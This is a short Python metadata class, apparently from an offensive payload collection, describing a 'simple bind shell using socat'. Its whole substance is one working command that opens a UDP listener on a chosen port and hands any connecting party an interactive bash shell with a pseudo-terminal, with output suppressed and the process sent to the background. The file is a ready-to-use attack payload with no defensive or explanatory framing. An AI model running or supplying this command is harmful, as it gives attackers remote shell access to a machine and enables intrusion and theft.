class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Simple bind shell using socat."
    function    = "bind shell"
    liner       = "socat udp-listen:PORT exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &"
